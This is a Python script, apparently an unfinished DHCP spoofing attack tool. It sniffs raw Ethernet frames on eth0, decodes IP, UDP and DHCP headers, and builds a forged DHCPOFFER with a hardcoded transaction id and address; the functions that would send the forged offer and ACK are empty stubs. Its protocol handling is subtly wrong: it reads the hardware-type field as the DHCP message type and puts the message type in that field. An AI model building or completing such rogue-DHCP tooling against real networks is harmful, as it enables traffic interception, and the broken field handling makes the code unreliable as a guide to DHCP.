import socket
import struct
import sys

from util.format import bytesToMac

ETH_P_ALL = 0x0003
ETH_P_IP = 0x0800
ETH_P_SIZE = 65536
ETH_LEN = 14

# DHCP Operations
DHCP_OP_REQUEST = 1
DHCP_OP_REPLY = 2

# DHCP Message types
DHCPDISCOVER = 1
DHCPOFFER = 2
DHCPREQUEST = 3
DHCPDECLINE = 4
DHCPACK = 5
DHCPNAK = 6
DHCPRELEASE = 7
DHCPINFORM = 8


def isIP(eth_packet: tuple) -> bool:
    return eth_packet[2] == ETH_P_IP


def decodeIP(eth_data: bytes) -> (str, str, bytes, bytes):
    ip = struct.unpack('!BBHHHBBH4s4s', eth_data[:20])
    ip_data = eth_data[20:]

    src = socket.inet_ntoa(ip[8])
    dest = socket.inet_ntoa(ip[9])
    proto = ip[6]

    return (src, dest, proto, ip_data)


def isUDP(ip_proto: int) -> bool:
    return ip_proto == 17


def decodeUDP(ip_data: bytes) -> (bytes, bytes, int, bytes):
    udp = struct.unpack('!HHHH', ip_data[:8])
    udp_data = ip_data[8:]

    psrc = udp[0]
    pdst = udp[1]
    length = udp[2]

    return (psrc, pdst, length, udp_data)


def isDHCP(psrc: int, pdst: int) -> bool:
    return psrc == 68 and pdst == 67 \
        or psrc == 67 and pdst == 68


def decodeDHCP(udp_data: bytes) -> (dict, bytes):
    dhcp = struct.unpack('!BBBBIHHIIII16s64s128sI', udp_data[:240])
    dhcp_data = udp_data[240:]

    def format_addr(x): return socket.inet_ntoa(struct.pack('!I', x))

    hlen = dhcp[2]
    d = {
        'op': dhcp[0],
        'htype': dhcp[1],
        'hlen': hlen,
        'hops': dhcp[3],
        'xid': dhcp[4],
        'secs': dhcp[5],
        'flags': dhcp[6],
        'ciaddr': format_addr(dhcp[7]),
        'yiaddr': format_addr(dhcp[8]),
        'siaddr': format_addr(dhcp[9]),
        'giaddr': format_addr(dhcp[10]),
        'chaddr': bytesToMac(dhcp[11][:hlen]),
        'sname': dhcp[12],
        'filename': dhcp[13],
        'magic': dhcp[14],
    }
    return (d, dhcp_data)

# ------------------------------------------------------------------------
# DHCP Spoofing area :D
# ------------------------------------------------------------------------


def getSpoofedDHCPOffer() -> bytes:
    def getZeroList(s: int):
        l = []
        for si in range(s):
            l.append(0x0)
        return l

    offer = struct.pack(
        '!BBBBIHHIIII16s64s128sI',
        DHCP_OP_REPLY,  # operation
        DHCPOFFER,  # type
        6,  # hlen | only one MAC address
        0x00,  # hops
        0x3903F326,  # xid
        0x0000,  # secs
        0x0000,  # flags
        struct.unpack('!I', socket.inet_aton('192.168.1.123'))[0],  # ciaddr
        struct.unpack('!I', socket.inet_aton('0.0.0.0'))[0],  # yiaddr
        struct.unpack('!I', socket.inet_aton('0.0.0.0'))[0],  # siaddr
        struct.unpack('!I', socket.inet_aton('0.0.0.0'))[0],  # giaddr
        bytearray(getZeroList(16)),  # chaddr
        bytearray(getZeroList(64)),  # sname
        bytearray(getZeroList(128)),  # file
        0x63825363,
    )

    return offer


def sendDHCPOfferSpoofed() -> None:
    offer = getSpoofedDHCPOffer()

    return None


def sendDHCPAckSpoofed() -> None:
    return None

# ------------------------------------------------------------------------
# End DHCP Spoofing
# ------------------------------------------------------------------------


def spoof(s: socket) -> None:
    while True:
        (packet, addr) = s.recvfrom(ETH_P_SIZE)

        eth_header = packet[:ETH_LEN]
        eth_data = packet[ETH_LEN:]
        eth = struct.unpack('!6s6sH', eth_header)

        print('MAC src:', bytesToMac(eth[1]))
        print('MAC dst:', bytesToMac(eth[0]))
        print('eth type:', hex(eth[2]))

        if isIP(eth):
            (ip_s, ip_d, ip_p, ip_data) = decodeIP(eth_data)
            print('\nIP Src:', ip_s)
            print('IP Dest:', ip_d)
            print('IP Proto:', ip_p)
            # print('IP Data:', ip_data)

            if isUDP(ip_p):
                (psrc, pdst, plen, udp_data) = decodeUDP(ip_data)
                print('\nUDP p_src:', psrc)
                print('UDP p_dst:', pdst)
                # print('UDP data:', udp_data)

                if isDHCP(psrc, pdst):
                    (dhcp, dhcp_data) = decodeDHCP(udp_data)
                    print('\nDHCP:', dhcp)
                    # print('DHCP data:', dhcp_data)

                    htype = dhcp['htype']
                    if htype == DHCPDISCOVER:
                        print('DHCP discover')
                        sendDHCPOfferSpoofed()
                    elif htype == DHCPREQUEST:
                        print('DHCP request')
                        sendDHCPAckSpoofed()
                    else:
                        print('Don\'t know this one :/')


if __name__ == "__main__":
    print('running...')
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                          socket.ntohs(ETH_P_ALL))
    except OSError as e:
        print('error creating the sniff socket', e)
        sys.exit(1)

    print('AF_PACKET sock created')
    s.bind(('eth0', 0))

    try:
        # The magic will happen
        spoof(s)
    except KeyboardInterrupt:
        print('exiting...')
